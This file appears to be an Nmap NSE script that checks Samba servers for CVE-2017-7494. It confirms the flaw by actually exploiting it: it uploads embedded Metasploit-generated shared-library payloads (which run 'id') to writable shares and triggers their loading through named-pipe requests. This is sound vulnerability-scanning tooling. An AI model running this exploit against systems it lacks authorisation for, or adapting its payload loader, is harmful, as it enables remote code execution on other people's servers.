local smb = require "smb"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"
local table = require "table"
local nmap = require "nmap"

description = [[
Checks if target machines are vulnerable to the arbitrary shared library load
vulnerability CVE-2017-7494.

Unpatched versions of Samba from 3.5.0 to 4.4.13, and versions prior to
4.5.10 and 4.6.4 are affected by a vulnerability that allows remote code
execution, allowing a malicious client to upload a shared library to a writable
share, and then cause the server to load and execute it.

The script does not scan the version numbers by default as the patches released
for the mainstream Linux distributions do not change the version numbers.

The script checks the preconditions for the exploit to happen:

1)  If the argument check-version is applied, the script will ONLY check
    services running potentially vulnerable versions of Samba, and run the
    exploit against those services. This is useful if you wish to scan a
    group of hosts quickly for the vulnerability based on the version number.
    However, because of ther version number, some patched versions may still
    show up as likely vulnerable. Here, we use smb.get_os(host) to do
    versioning of the Samba version and compare it to see if it is a known
    vulnerable version of Samba. Note that this check is not conclusive:
    See 2,3,4

2)  Whether there exists writable shares for the execution of the script.
    We must be able to write to a file to the share for the exploit to
    take place. We hence enumerate the shares using
    smb.share_find_writable(host) which returns the main_name, main_path
    and a list of writable shares.

3)  Whether the workaround (disabling of named pipes) was applied.
    When "nt pipe support = no" is configured on the host, the service
    would not be exploitable. Hence, we check whether this is configured
    on the host using smb.share_get_details(host, 'IPC$'). The error
    returned would be "NT_STATUS_ACCESS_DENIED" if the workaround is
    applied.

4)  Whether we can invoke the payloads from the shares.
    Using payloads from Metasploit, we upload the library files to
    the writable share obtained from 2). We then make a named pipe request
    using NT_CREATE_ANDX_REQUEST to the actual local filepath and if the
    payload executes, the status return will be false. Note that only
    Linux_x86 and Linux_x64 payloads are tested in this script.

This script is based on the metasploit module written by hdm.

References:
* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb
* https://www.samba.org/samba/security/CVE-2017-7494.html
* http://blog.nsfocus.net/samba-remote-code-execution-vulnerability-analysis/
]]

---
-- @usage nmap --script smb-vuln-cve-2017-7494 -p 445 <target>
-- @usage nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <target>
-- @output
-- PORT    STATE SERVICE
-- 445/tcp open  microsoft-ds
-- MAC Address: 00:0C:29:16:04:53 (VMware)
--
-- | smb-vuln-cve-2017-7494:
-- |   VULNERABLE:
-- |   SAMBA Remote Code Execution from Writable Share
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-7494
-- |     Risk factor: HIGH  CVSSv3: 7.5 (HIGH) (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
-- |       All versions of Samba from 3.5.0 onwards are vulnerable to a remote
-- |       code execution vulnerability, allowing a malicious client to upload a
-- |       shared library to a writable share, and then cause the server to load
-- |       and execute it.
-- |
-- |     Disclosure date: 2017-05-24
-- |     Check results:
-- |       Samba Version: 4.3.9-Ubuntu
-- |       Writable share found.
-- |        Name: \\192.168.15.131\test
-- |       Exploitation of CVE-2017-7494 succeeded!
-- |     Extra information:
-- |       All writable shares:
-- |        Name: \\192.168.15.131\test
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494
-- |_      https://www.samba.org/samba/security/CVE-2017-7494.html
--
-- @xmloutput
-- <table key="CVE-2017-7494">
-- <elem key="title">SAMBA Remote Code Execution from Writable Share</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2017-7494</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv3">7.5 (HIGH) (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)</elem>
-- </table>
-- <table key="description">
-- <elem>All versions of Samba from 3.5.0 onwards are vulnerable to a remote&#xa;code execution vulnerability, allowing a malicious client to upload a&#xa;shared library to a writable share, and then cause the server to load&#xa;and execute it.&#xa;</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2017</elem>
-- <elem key="day">24</elem>
-- <elem key="month">05</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2017-05-24</elem>
-- <table key="check_results">
-- <elem>Samba Version: 4.3.9-Ubuntu</elem>
-- <elem>Writable share found. &#xa; Name: \\192.168.15.131\test</elem>
-- <elem>Exploitation of CVE-2017-7494 succeeded!</elem>
-- </table>
-- <table key="extra_info">
-- <elem>All writable shares:</elem>
-- <elem> Name: \\192.168.15.131\test</elem>
-- </table>
-- <table key="refs">
-- <elem>https://www.samba.org/samba/security/CVE-2017-7494.html</elem>
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494</elem>
-- </table>
-- </table>
-- @args smb-vuln-cve-2017-7494.check-version Check only the version numbers the target's Samba service. Default: false
--
---

author = "Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln","intrusive"}

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

dependencies = {"smb-os-discovery", "smb-brute"}

--linux/x86/exec (CMD=id)
local PAYLOAD_X86 = {
0x7F, 0x45, 0x4C, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x03, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00,
0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
0x02, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x1C, 0x01, 0x00, 0x00, 0x42, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00,
0xC4, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xC4, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,
0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
0xF4, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0x0B, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2D, 0x63, 0x89,
0xE7, 0x68, 0x2F, 0x73, 0x68, 0x00, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x52, 0xE8, 0x03,
0x00, 0x00, 0x00, 0x69, 0x64, 0x00, 0x57, 0x53, 0x89, 0xE1, 0xCD, 0x80,
}

--linux/x64/exec (CMD=id)
local PAYLOAD_X64 = {
0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x03, 0x00, 0x3E, 0x00, 0x01, 0x00, 0x00, 0x00, 0x92, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x02, 0x00, 0x40, 0x00, 0x02, 0x00, 0x01, 0x00,
0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xBC, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x90, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x6A, 0x3B, 0x58, 0x99, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00,
0x53, 0x48, 0x89, 0xE7, 0x68, 0x2D, 0x63, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x52, 0xE8, 0x03, 0x00,
0x00, 0x00, 0x69, 0x64, 0x00, 0x56, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05,
}

PAYLOAD_X86 = string.char(table.unpack(PAYLOAD_X86))
PAYLOAD_X64 = string.char(table.unpack(PAYLOAD_X64))

-- directories to look through if actual path cannot be queried
local COMMON_DIRS = {"/volume1/","/volume2/","/volume3/","/volume4/",
  "/shared/","/mnt/","/mnt/usb/","/media/","/mnt/media/","/var/samba/",
  "/tmp/","/home/","/home/shared/"}

-- filename used to save into the shared folders
local FILENAME = 'test.so'

local payloads = {PAYLOAD_X86, PAYLOAD_X64}

--- Determines whether the version of Samba is vulnerable and sets it in the
--  table samba_cve. Note that version numbers may not indicate vulnerability
--  as there are patches released (e.g. for Ubuntu) which did not change the
--  version of Samba
--
--  @param version The string containing the version of Samba
--  @param samba_cve The vuln table containing information for the results
local function determine_vuln_version(version, samba_cve)
  local major, minor, patch
  major, minor, patch = string.match(version,"(%d+)%.(%d+)%.(%d+).*")
  stdnse.debug("Major version: %s, Minor version: %s, Patch version: %s", major, minor, patch)
  major, minor, patch = tonumber(major), tonumber(minor), tonumber(patch)

  -- no patches available for 3.5.X and 3.6.X
  if major == 3 and minor >= 5 then
    samba_cve.state = vulns.STATE.LIKELY_VULN
  elseif major == 4 then
    if minor < 4 then
      samba_cve.state = vulns.STATE.LIKELY_VULN
    -- patched in 4.4.14
    elseif minor == 4 and patch < 14 then
      samba_cve.state = vulns.STATE.LIKELY_VULN
    -- patched in 4.5.10
    elseif minor == 5 and patch < 10 then
      samba_cve.state = vulns.STATE.LIKELY_VULN
    -- patched in 4.6.4
    elseif minor == 6 and patch < 4 then
      samba_cve.state = vulns.STATE.LIKELY_VULN
    end
  end
end

--- Finds all writable shares on the target host and stores the name and path
--  into samba_cve stable, using smb.share_find_writable
--
--  @param host The target host
--  @param samba_cve The vuln table containing information for the results
--  @return (main_name, main_path) Two strings, containing the name of the main
--  writable share and its path
local function find_writable_shares(host, samba_cve)
  -- determine if there are writable shares
  local status, main_name, main_path, names
  status, main_name, main_path, names = smb.share_find_writable(host)

  -- successful in finding writable share
  if status then
    local msg = string.format("Writable share found. \n Name: %s", main_name)
    if main_path then
      msg = msg .. string.format("\n Path: %s ", main_path)
    end

    -- insert main writable directory with path into check_results
    table.insert(samba_cve.check_results, msg)

    -- insert names of other writable shares to extra_info
    if #names > 0 then
      table.insert(samba_cve.extra_info, string.format(
        "All writable shares:"))
    end
    for i = 1, #names, 1 do
      table.insert(samba_cve.extra_info, string.format(" Name: %s", main_name))
    end
  else
    -- writable share enumeration failed, return error message stored in main_name
    local err = main_name
    table.insert(samba_cve.extra_info, err)
    main_name = nil
  end

  -- main_path is C:\<actual share>
  -- we map it to the equivalent statement in Unix filesystems
  -- i.e. /<actual share>/
  if main_path then
    main_path = "/" .. string.sub(main_path, 4) .. "/"
  end

  return main_name, main_path
end

--- Check if the suggested workaround "nt pipe support = no" was applied on
--  the target host. The script checks if details can be queried on IPC$
--  which in a typical case will return details on the IPC, but if the
--  workaround is applied, an error of 'NT_STATUS_ACCESS_DENIED' is returned
--
--  @param host The target host
--  @param samba_cve The vuln table containing information for the results
--  @return A boolean indicating the nt pipe support is enabled, which
--          indicates the workaround was not applied
local function is_ntpipesupport_enabled(host, samba_cve)
  -- do "nt pipe support = no" workaround check, in which case
  -- accessing 'IPC$' returns 'NT_STATUS_ACCESS_DENIED'
  local status, result
  status, result = smb.share_get_details(host, 'IPC$')

  if status and result['details'] == "NT_STATUS_ACCESS_DENIED" then
    samba_cve.state = vulns.STATE.NOT_VULN
    return false
  elseif not status then
    -- error accessing IPC$, present error to user
    local err = result
    table.insert(samba_cve.extra_info, err)
  end

  return true
end

--- Creates candidate paths for common directories of shares
--  This is method is based off the Metasploit script.
--
--  @param share_name Name of the share that you wish to write to
--  ireturn Array of candidate paths of the shares, never nil
local function enumerate_directories(share_name)
  local candidates = {}

   -- enumerate through all locations to find the file
  for i = 1, #COMMON_DIRS, 1 do
    table.insert(candidates, COMMON_DIRS[i])
    table.insert(candidates, COMMON_DIRS[i] .. share_name)
    table.insert(candidates, COMMON_DIRS[i] .. string.upper(share_name))
    table.insert(candidates, COMMON_DIRS[i] .. string.lower(share_name))
    table.insert(candidates, COMMON_DIRS[i] .. string.gsub(share_name, " ", "_"))
  end

  return candidates
end

--- Uploads the payloads in the array into a file each on the writable share.
--  Because the execution of the payload must match the architecture of the
--  target system, the function will try to test against each payload from
--  different architectures. The payloads were generated from Metasploit.
--
--  The function will then test if the system is vulnerable by making a NT
--  Create AndX Request on the IPC$ on the actual path of the file containing
--  the payload. It will first try to see if the actual path was retrieved
--  using previously by checking for the path argument. If it is not supplied,
--  because we do not know where the actual files are stored on the filesystem,
--  we have to make guesses on common directories. The status returned when
--  the payload executes is false, indicating that the system is vulnerable.
--
-- @param host The target host
-- @param samba_cve The vuln table containing information for the results
-- @param payloads An array containing payloads from different architectures
-- @param name The name of the writable share
-- @param path The canonical path of the share
local function test_cve2017_7494(host, samba_cve, payloads, name, path)
  local status, result, err, share_name
  local candidates = {}

  -- create the files of both payloads on the share
  -- the files are named as follows:
  -- <index><base_filename>
  for i, l_payload in ipairs(payloads) do
    for _, anon in ipairs({true, false}) do
      status, err = smb.file_write(host, l_payload, name,
        tostring(i) .. FILENAME, anon)
      stdnse.debug1("Write file status %s , err %s", status, err)
      if status then break end
    end
  end

  -- check if a proper filepath is returned from smb probes and use it
  if path then
    table.insert(candidates, path)
  else
    share_name = string.match(name, "\\\\.*\\(.*)") .. '/'
    candidates = enumerate_directories(share_name)
  end

  -- try all candidate payloads
  for h = 1, #payloads, 1 do
    local l_filename = tostring(h) .. FILENAME
    -- loop through all common candidate paths
    for i = 1, #candidates, 1 do
      local path = candidates[i] .. l_filename
      local pipe_formats = {"\\\\PIPE\\".. path , path}
      -- test both pipe formats for each path
      for j = 1, #pipe_formats, 1 do
        local curr_path = pipe_formats[j]
        -- make an simple SMB connection to IPC$
        local status, smbstate = smb.start_ex(host, true, true, "\\\\" ..
          host.ip .. "\\IPC$", nil, nil, nil)
        if not status then
          stdnse.debug1("Could not connect to IPC$")
        else
          local overrides = {}
          -- perform NT Create NX Request on candidate file paths
          overrides['file_create_disposition'] = 0x1    -- FILE_OPEN
          overrides['file_create_security_flags'] = 0x0 -- No dynamic tracking, no security context

          stdnse.debug1("Trying path : %s", curr_path)
          status, result = smb.create_file(smbstate, curr_path, overrides)
          stdnse.debug1("Status: %s, Result: %s", status, result)
          -- on payload execution, result will be false and server will disconnect
          if not status and string.match(result, "SMB: ERROR: Server disconnected the connection") then
            samba_cve.state = vulns.STATE.VULN
            table.insert(samba_cve.check_results,
              "Exploitation of CVE-2017-7494 succeeded!")
            return
          end
        end
      end
    end
  end
  if samba_cve.state ~= vulns.STATE.VULN and not path then
    samba_cve.state = vulns.STATE.LIKELY_VULN
    table.insert(samba_cve.check_results,
      'File written to remote share, but unable to execute payload either due to unknown actual path, or the system may be patched.')
  end
end

action = function(host,port)
  local port = nmap.get_port_state(host,{number=smb.get_port(host),protocol='tcp'})

  local result, stats
  local response = {}

  local samba_cve  = {
    title = "SAMBA Remote Code Execution from Writable Share",
    IDS = {CVE = 'CVE-2017-7494'},
    risk_factor = "HIGH",
    scores = {
      CVSSv3 = "7.5 (HIGH) (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)"
    },
    description = [[
All versions of Samba from 3.5.0 onwards are vulnerable to a remote
code execution vulnerability, allowing a malicious client to upload a
shared library to a writable share, and then cause the server to load
and execute it.
]],
    references = {
      'https://www.samba.org/samba/security/CVE-2017-7494.html',
    },
    dates = {
      disclosure = {year = '2017', month = '05', day = '24'},
    },
    check_results = {},
    extra_info = {}
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  samba_cve.state = vulns.STATE.NOT_VULN

  local check_version = stdnse.get_script_args(SCRIPT_NAME .. ".check-version") or false
  -- check if they put false or similar
  if check_version and string.lower(check_version) == "false" then
    check_version = nil
  end

  local version = port.version.version

  -- retrieve version of samba using smb.get_os
  if not version then
    local status, result = smb.get_os(host)

    if(status == false) then
      return stdnse.format_output(false, result)
    end

    -- result.lanmanager contains OS version information
    -- string returned by result.lanmanager looks like Samba 4.3.9-Ubuntu
    -- we only want 4.3.9-Ubuntu
    if string.match(result.lanmanager,"^Samba ") then
      version = string.match(result.lanmanager,"^Samba (.*)")
    else
      return stdnse.format_output(false,
        "Either versioning failed or samba does not exist on the port!")
    end
  end

  table.insert(samba_cve.check_results,
    string.format("Samba Version: %s",version))

  if check_version then
    stdnse.debug("Port Version: %s", port.version.version)
    -- determine if version is vulnerable
    determine_vuln_version(version, samba_cve)

  -- The first set of conditions sees if version checking is specified
  -- to speed up checks so only hosts with versions that are likely to be
  -- vulnerable are scanned, the second part of the condition allows
  -- the script to run try the exploit on the samba share regardless
  -- of version. In this case, the latter is the default.
  elseif (check_version and samba_cve == vulns.STATE.LIKELY_VULN) or not check_version then
    local name, path
    -- vulnerability requires library to be written to share
    name, path = find_writable_shares(host, samba_cve)
    stdnse.debug1("Writable share name: %s, Path returned: %s", name, path)

    -- do "nt pipe support = no" workaround check, which prevents exploitation
    local ntpipe_enabled = is_ntpipesupport_enabled(host, samba_cve)

    -- some patches for samba do not affect version numbers
    -- e.g. 2:4.3.11+dfsg-0ubuntu0.16.04.7
    -- in reality they are not vulnerable
    -- patched versions prevents named pipes containing '/'
    -- more information is available on the patch
    -- https://git.samba.org/?p=samba.git;a=blobdiff;f=source3/rpc_server/srv_pipe.c;h=f79fbe26abff1e3a2b3f3a21480196afc09d13b1;hp=39f5fb49ec3c0e011a5c6ad4b7ac60bcf49af05a;hb=02a76d86db0cbe79fcaf1a500630e24d961fa149;hpb=82bb44dd3b7f42b90494294b32f8413a39cb2030
    -- therefore we need to ascertain if the exploit works
    if name and ntpipe_enabled then
      test_cve2017_7494(host, samba_cve, payloads, name, path)

      for i, _ in ipairs(payloads) do
        smb.file_delete(host, name, tostring(i) .. FILENAME)
      end
    end

  end

  return report:make_output(samba_cve)
end
